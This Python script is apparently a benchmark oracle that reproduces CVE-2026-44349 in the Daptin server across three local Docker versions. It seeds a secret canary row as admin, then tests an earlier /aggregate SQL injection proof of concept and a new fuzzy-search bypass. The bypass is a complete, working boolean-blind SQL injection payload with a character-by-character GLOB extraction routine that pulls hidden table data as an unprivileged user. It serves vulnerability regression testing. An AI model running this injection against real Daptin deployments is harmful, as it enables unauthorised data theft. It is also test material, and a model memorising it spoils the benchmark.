#!/usr/bin/env python3
"""Flag differential oracle for daptin-cve-2026-44349.

Sibling-code-path incomplete fix: CVE-2026-41422 fixed the /aggregate
column projection SQLi (goqu.L(project)) at v0.11.4, but the same release
introduced processFuzzySearch which passes user-supplied column names into
goqu.L(fmt.Sprintf("LOWER(%s) LIKE ?", col)) without validation, enabling
boolean-blind SQLi via the fuzzy-search API.

Canary: the oracle registers an admin user (first user = admin), creates
a pcb_canary entity, inserts a row with $PCB_FLAG, then restarts the
container so Daptin materializes the new table. A separate attacker user
cannot read the canary via normal API but can extract it via SQLi.

Versions:
  V0 = daptin:v0.9.82  (aggregate SQLi open)
  V1 = daptin:v0.11.4  (aggregate fixed; fuzzy-search SQLi open)
  V2 = daptin:v0.11.5  (both fixed)

Usage:
  python3 oracle.py --run-gate          # full lifecycle
  PCB_FLAG=<tok> python3 oracle.py --gate  # envs up + seeded
"""
from __future__ import annotations

import argparse
import json
import os
import subprocess
import sys
import time
import urllib.parse
from pathlib import Path

HERE = Path(__file__).resolve().parent
sys.path.insert(0, str(HERE.parents[1]))
from flag_oracle import contains_flag, new_flag  # noqa: E402

sys.path.insert(0, str(HERE))
from original_poc import candidate as original_candidate  # noqa: E402

FLAG = os.environ.get("PCB_FLAG") or new_flag()

BASE = {
    "v0": "http://127.0.0.1:39082",
    "v1": "http://127.0.0.1:39114",
    "v2": "http://127.0.0.1:39115",
}

CONTAINER = {
    "v0": "daptin-cve-2026-44349-v0-1",
    "v1": "daptin-cve-2026-44349-v1-1",
    "v2": "daptin-cve-2026-44349-v2-1",
}

ADMIN = {"email": "admin@pcb.test", "password": "PcbAdm1n!Str0ng9"}
ATTACKER = {"email": "attacker@pcb.test", "password": "Att4ck3r!PwD9"}

CHARSET = "0123456789abcdefPCBFLAG_"


# ------------------------------------------------------------------ #
# HTTP helpers                                                         #
# ------------------------------------------------------------------ #

def _curl(args: list, timeout: int = 15) -> str:
    r = subprocess.run(
        ["curl", "-sf", "-m", str(timeout)] + args,
        capture_output=True, text=True, check=False, timeout=timeout + 5,
    )
    return r.stdout


def _get_json(url: str, token: str) -> dict:
    out = _curl([url, "-H", f"Authorization: Bearer {token}"])
    try:
        return json.loads(out)
    except Exception:
        return {"_raw": out}


def _post_json(url: str, token: str, body) -> dict:
    out = _curl(["-X", "POST", url,
                 "-H", f"Authorization: Bearer {token}",
                 "-H", "Content-Type: application/vnd.api+json",
                 "-d", json.dumps(body) if isinstance(body, dict) else body])
    try:
        return json.loads(out)
    except Exception:
        return {"_raw": out}


def _register(base, name, email, pw):
    _curl(["-X", "POST", f"{base}/action/user_account/signup",
           "-H", "Content-Type: application/json",
           "-d", json.dumps({"attributes": {
               "name": name, "email": email,
               "password": pw, "passwordConfirm": pw}})])


def _login(base, email, pw) -> str:
    out = _curl(["-X", "POST", f"{base}/action/user_account/signin",
                 "-H", "Content-Type: application/json",
                 "-d", json.dumps({"attributes": {"email": email, "password": pw}})])
    try:
        for item in json.loads(out):
            if item.get("ResponseType") == "client.store.set":
                return item["Attributes"]["value"]
    except Exception:
        pass
    return ""


def _wait_api(base: str, tries: int = 60) -> bool:
    for _ in range(tries):
        out = _curl([f"{base}/api/world"], timeout=5)
        if '"data"' in out:
            return True
        time.sleep(2)
    return False


# ------------------------------------------------------------------ #
# Canary seeding                                                       #
# ------------------------------------------------------------------ #

def seed_canary(version: str, flag: str) -> bool:
    """Register admin, create pcb_canary entity, restart container to
    materialize it, then insert the flag. Returns True on success."""
    base = BASE[version]
    container = CONTAINER[version]

    # 1. Register admin (first user becomes admin)
    _register(base, "pcbadmin", ADMIN["email"], ADMIN["password"])
    token = _login(base, ADMIN["email"], ADMIN["password"])
    if not token:
        print(f"  [{version}] admin login failed", file=sys.stderr)
        return False

    # 2. Create pcb_canary entity via world API
    schema = json.dumps({
        "Columns": [{"Name": "token", "ColumnName": "token",
                      "ColumnType": "label", "DataType": "varchar(500)",
                      "IsNullable": False}],
        "DefaultPermission": 0,
    })
    _post_json(f"{base}/api/world", token, {
        "data": {"type": "world", "attributes": {
            "table_name": "pcb_canary",
            "world_schema_json": schema,
            "permission": 0,
            "is_hidden": 1,
        }}
    })

    # 3. Restart container so Daptin materializes the new entity table
    subprocess.run(["docker", "restart", container],
                   capture_output=True, check=False)
    if not _wait_api(base, tries=45):
        print(f"  [{version}] API not ready after restart", file=sys.stderr)
        return False

    # 4. Re-login and insert canary row
    token = _login(base, ADMIN["email"], ADMIN["password"])
    if not token:
        print(f"  [{version}] admin re-login failed", file=sys.stderr)
        return False

    resp = _post_json(f"{base}/api/pcb_canary", token, {
        "data": {"type": "pcb_canary", "attributes": {"token": flag}}
    })
    ok = isinstance(resp.get("data"), dict) and resp["data"].get("type") == "pcb_canary"
    if ok:
        print(f"  [{version}] canary seeded", file=sys.stderr)
    else:
        print(f"  [{version}] canary insert failed: {json.dumps(resp)[:100]}",
              file=sys.stderr)
    return ok


# ------------------------------------------------------------------ #
# Original PoC (CVE-2026-41422: /aggregate column projection SQLi)     #
# ------------------------------------------------------------------ #

def run_original_probe(version: str = "v1") -> dict:
    base = BASE[version]
    _register(base, "attacker", ATTACKER["email"], ATTACKER["password"])
    token = _login(base, ATTACKER["email"], ATTACKER["password"])
    if not token:
        return {"version": version, "error": "login failed"}

    cand = original_candidate()
    col = cand["params"]["column"]
    url = f"{base}/aggregate/{cand['entity']}?column={urllib.parse.quote(col)}"
    resp = _get_json(url, token)
    return {"version": version, "probe_id": cand["probe_id"], "response": resp}


# ------------------------------------------------------------------ #
# Bypass PoC (CVE-2026-44349: fuzzy-search boolean-blind SQLi)         #
# ------------------------------------------------------------------ #

def _fuzzy_total(base: str, token: str, col_inj: str) -> int:
    query = json.dumps([{
        "column": col_inj,
        "operator": "fuzzy",
        "value": "XYZNOEXIST",
    }])
    url = f"{base}/api/world?query={urllib.parse.quote(query)}&page%5Bsize%5D=1"
    resp = _get_json(url, token)
    return resp.get("links", {}).get("total", 0)


def _blind_extract(base: str, token: str, table: str, column: str,
                   max_len: int = 50) -> str:
    """Use GLOB (case-sensitive in SQLite) instead of LIKE (case-insensitive)."""
    extracted = ""
    for _ in range(max_len):
        found = False
        for ch in CHARSET:
            # GLOB uses * for multi-char wildcard, ? for single-char.
            # Escape glob special chars in the accumulated prefix.
            glob_pat = (extracted + ch).replace("[", "[[]").replace("*", "[*]").replace("?", "[?]") + "*"
            col_inj = (
                f"table_name) LIKE 'XYZNOEXIST' "
                f"OR (SELECT {column} FROM {table} ORDER BY id DESC LIMIT 1) GLOB '{glob_pat}' "
                f"OR LOWER(table_name"
            )
            if _fuzzy_total(base, token, col_inj) > 0:
                extracted += ch
                found = True
                break
        if not found:
            break
    return extracted


def run_bypass_probe(version: str = "v1") -> dict:
    base = BASE[version]
    _register(base, "attacker", ATTACKER["email"], ATTACKER["password"])
    token = _login(base, ATTACKER["email"], ATTACKER["password"])
    if not token:
        return {"version": version, "error": "login failed"}

    # Verify SQLi works
    test_inj = "table_name) LIKE 'XYZNOEXIST' OR 1=1 OR LOWER(table_name"
    sqli_works = _fuzzy_total(base, token, test_inj) > 0

    if not sqli_works:
        return {"version": version,
                "probe_id": "cve-2026-44349-fuzzy-column-sqli",
                "sqli_works": False, "extracted": ""}

    extracted = _blind_extract(base, token, "pcb_canary", "token")
    return {"version": version,
            "probe_id": "cve-2026-44349-fuzzy-column-sqli",
            "sqli_works": True, "extracted": extracted}


# ------------------------------------------------------------------ #
# Gate                                                                 #
# ------------------------------------------------------------------ #

def gate() -> dict:
    print("Running gate...", file=sys.stderr)
    print("  Testing original PoC on V0...", file=sys.stderr)
    orig_v0 = run_original_probe("v0")
    print(f"    flag found: {contains_flag(orig_v0, FLAG)}", file=sys.stderr)

    print("  Testing original PoC on V1...", file=sys.stderr)
    orig_v1 = run_original_probe("v1")
    print(f"    flag found: {contains_flag(orig_v1, FLAG)}", file=sys.stderr)

    print("  Testing bypass PoC on V1 (blind extraction)...", file=sys.stderr)
    bypass_v1 = run_bypass_probe("v1")
    print(f"    extracted: {bypass_v1.get('extracted', '')[:20]}...", file=sys.stderr)

    print("  Testing bypass PoC on V2...", file=sys.stderr)
    bypass_v2 = run_bypass_probe("v2")
    print(f"    sqli_works: {bypass_v2.get('sqli_works')}", file=sys.stderr)

    result = {
        "original_poc_reaches_flag_on_v0": contains_flag(orig_v0, FLAG),
        "original_poc_blocked_on_v1": not contains_flag(orig_v1, FLAG),
        "bypass_poc_reaches_flag_on_v1": contains_flag(bypass_v1, FLAG),
        "bypass_poc_blocked_on_v2": not contains_flag(bypass_v2, FLAG),
        "_details": {
            "orig_v0_flag": contains_flag(orig_v0, FLAG),
            "orig_v1_flag": contains_flag(orig_v1, FLAG),
            "bypass_v1_extracted": bypass_v1.get("extracted", ""),
            "bypass_v1_sqli": bypass_v1.get("sqli_works"),
            "bypass_v2_extracted": bypass_v2.get("extracted", ""),
            "bypass_v2_sqli": bypass_v2.get("sqli_works"),
            "flag_len": len(FLAG),
            "flag_prefix": FLAG[:12],
        },
    }
    result["passed"] = all([
        result["original_poc_reaches_flag_on_v0"],
        result["original_poc_blocked_on_v1"],
        result["bypass_poc_reaches_flag_on_v1"],
        result["bypass_poc_blocked_on_v2"],
    ])
    return result


# ------------------------------------------------------------------ #
# Orchestration                                                        #
# ------------------------------------------------------------------ #

def _compose(*args, env=None):
    return subprocess.run(
        ["docker", "compose", *args],
        cwd=str(HERE), text=True, capture_output=True, check=False,
        env={**os.environ, **(env or {})},
    )


def _pf(profiles):
    f = []
    for p in profiles:
        f += ["--profile", p]
    return f


def run_gate(profiles=("v0", "v1", "v2"), keep_up=False) -> dict:
    global FLAG
    FLAG = new_flag()
    env = {"PCB_FLAG": FLAG}
    all_pf = _pf(("v0", "v1", "v2"))

    _compose(*all_pf, "down", "-v", env=env)

    r = _compose(*_pf(profiles), "up", "-d", env=env)
    if r.returncode != 0:
        return {"error": "compose up failed", "stderr": r.stderr}

    # Wait for APIs
    ready = {}
    for v in profiles:
        ready[v] = _wait_api(BASE[v])
        print(f"  {v} ready: {ready[v]}", file=sys.stderr)

    # Seed canary on each version
    seeded = {}
    for v in profiles:
        if ready[v]:
            seeded[v] = seed_canary(v, FLAG)
        else:
            seeded[v] = False

    result = gate()
    result["_env_ready"] = ready
    result["_canary_seeded"] = seeded
    result["_flag"] = FLAG

    if not keep_up:
        _compose(*all_pf, "down", "-v", env=env)

    return result


if __name__ == "__main__":
    ap = argparse.ArgumentParser()
    ap.add_argument("--gate", action="store_true")
    ap.add_argument("--run-gate", action="store_true")
    ap.add_argument("--keep-up", action="store_true")
    a = ap.parse_args()
    if a.run_gate:
        print(json.dumps(run_gate(keep_up=a.keep_up), indent=2))
    else:
        print(json.dumps(gate(), indent=2))
